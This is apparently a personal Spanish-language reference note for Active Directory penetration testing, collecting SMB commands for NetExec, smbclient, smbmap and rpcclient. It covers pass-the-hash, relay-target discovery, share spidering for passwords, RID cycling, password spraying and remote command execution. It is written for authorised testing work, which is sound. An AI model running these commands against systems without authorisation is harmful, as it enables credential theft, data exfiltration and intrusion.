---
tipo: meta
aliases:
  - SMB - matriz
  - smb cheatsheet
  - nxc smb
tags:
  - meta/referencia
  - dominio/ad
---

# SMB - matriz de referencia

> [!info] Referencia pura, no un zettel
> Las cuatro herramientas —`nxc smb` (NetExec), `smbclient`, `smbmap`, `rpcclient`— **por tarea**, no por herramienta: así se ve la diferencia de una. El criterio de SMB vive en [[SMB]] y [[MOC - AD enumeración]]; la teoría, en [[SMB - dialectos y firma]] y [[SMB - sesión nula e IPC$]]. La ejecución remota (psexec/smbexec) es otra familia: [[AD movimiento lateral - matriz de referencia]].

`HOST`, `u`, `p` son marcadores. Cada herramienta acepta las mismas formas de autenticación; ver la primera sección y aplicarlas a todo lo demás.

## Autenticar — las formas, en las cuatro

Sesión nula (anónima):
`nxc smb HOST -u '' -p ''`
`smbclient -L //HOST/ -N`
`smbmap -H HOST -u '' -p ''`
`rpcclient -U '' -N HOST`

Usuario y contraseña:
`nxc smb HOST -u u -p p`
`smbclient //HOST/share -U 'DOMINIO\u%p'`
`smbmap -H HOST -u u -p p -d DOMINIO`
`rpcclient -U 'DOMINIO\u%p' HOST`

Pass-the-hash (NTLM, sin contraseña):
`nxc smb HOST -u u -H LMHASH:NTHASH`
`smbclient //HOST/share -U u --pw-nt-hash NTHASH`
`smbmap -H HOST -u u -p 'LMHASH:NTHASH'`
`rpcclient -U u --pw-nt-hash NTHASH HOST`

Kerberos (ticket en `KRB5CCNAME`):
`nxc smb HOST -u u -k` · `smbclient //HOST/share -k` · `smbmap -H HOST -k` · `rpcclient -k HOST`

## Comprobar host, firma y dialecto

`nxc smb 10.0.0.0/24`
Barrido: nombre, dominio, versión de SMB y **si exige firma**. La columna `signing:False` marca candidato a relay ([[Relay de NTLM]]).
`nxc smb HOST --gen-relay-list objetivos.txt`
Vuelca directo la lista de hosts sin firma.
smbclient/smbmap/rpcclient no reportan la firma — para eso, `nxc`.

## Listar shares

`nxc smb HOST -u u -p p --shares`  ← muestra también el permiso (READ/WRITE)
`smbmap -H HOST -u u -p p`  ← su fuerte: shares + permiso efectivo de una
`smbclient -L //HOST/ -U u%p`
`rpcclient -U u%p HOST -c 'netshareenumall'`

## Leer, navegar y descargar

`smbclient //HOST/share -U u%p`  → dentro: `ls`, `cd`, `get archivo`, `mget *`
Descarga recursiva en smbclient: `recurse ON; prompt OFF; mget *`
`smbmap -H HOST -u u -p p -r 'share'`  ← navegar recursivo
`smbmap -H HOST -u u -p p --download 'share\ruta\archivo'`
`nxc smb HOST -u u -p p --get-file '\\ruta\archivo' salida.local`
rpcclient no transfiere archivos.

## Escribir y subir

`smbclient //HOST/share -U u%p -c 'put local.exe remoto.exe'`
`smbmap -H HOST -u u -p p --upload 'local.exe' 'share\remoto.exe'`
`nxc smb HOST -u u -p p --put-file local.exe '\\share\remoto.exe'`
rpcclient no escribe archivos.

## Buscar archivos y contenido (spider)

`smbmap -H HOST -u u -p p -R 'share' --depth 5`  ← recorrer todo
`smbmap -H HOST -u u -p p -R 'share' -A 'password'`  ← baja los archivos que matcheen el patrón
`nxc smb HOST -u u -p p -M spider_plus`  ← inventario a JSON en /tmp
`nxc smb HOST -u u -p p -M spider_plus -o DOWNLOAD_FLAG=True`
smbclient/rpcclient: manual.

## Usuarios, grupos y política de contraseñas

`nxc smb HOST -u u -p p --users`  ·  `--groups`  ·  `--pass-pol`  ·  `--loggedon-users`
`rpcclient -U u%p HOST -c 'enumdomusers'`  ·  `'enumdomgroups'`  ·  `'querygroupmem 0xRID'`
Política de contraseñas por RPC: `rpcclient ... -c 'getdompwinfo'`
Detalle de un usuario: `rpcclient ... -c 'queryuser 0xRID'`
smbmap/smbclient no enumeran el directorio.

## RID cycling (sesión nula cerrada, guest abierto)

`nxc smb HOST -u guest -p '' --rid-brute 10000`
`rpcclient -U u%p HOST -c 'lookupsids S-1-5-21-...-1000'`  (uno a uno)
`for r in $(seq 500 1100); do rpcclient -U u%p HOST -c "queryuser $r" 2>/dev/null | grep 'User Name'; done`
solo nxc y rpcclient.

## Password spraying

`nxc smb HOST -u usuarios.txt -p 'Verano2026!' --continue-on-success`
Pares usuario:contraseña 1 a 1: agregar `--no-bruteforce` con `-u users.txt -p pass.txt`.
Es la herramienta de spray; las otras tres no.

## Ejecución de comandos (requiere admin)

`nxc smb HOST -u u -p p -x 'whoami /all'`   (cmd)
`nxc smb HOST -u u -p p -X '$PSVersionTable'` (powershell)
Para el resto de los métodos de exec (psexec, smbexec, wmiexec), [[AD movimiento lateral - matriz de referencia]].

## rpcclient — consultas puntuales de RPC

`srvinfo`  — versión y rol del servidor
`enumdomains` · `lsaquery`  — dominios y SID del dominio
`lsaenumsid`  — SIDs conocidos por la LSA
`enumprivs`  — privilegios definidos
`netshareenumall`  — shares (incluye ocultos)

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `STATUS_ACCESS_DENIED` al listar | sesión nula cerrada / sin permiso | probar `guest`, o credencial |
| `NT_STATUS_LOGON_FAILURE` | credencial o formato de hash mal | hash como `LM:NT`, o `--pw-nt-hash` |
| smbclient: `protocol negotiation failed` | server exige SMB2+, cliente ofrece SMB1 | `-m SMB3` |
| `NT_STATUS_MORE_PROCESSING_REQUIRED` (kerberos) | reloj desfasado con el DC | sincronizar hora (`ntpdate`/`faketime`) |
| RID cycling vacío | anónimo restringido | usar credencial de dominio cualquiera |
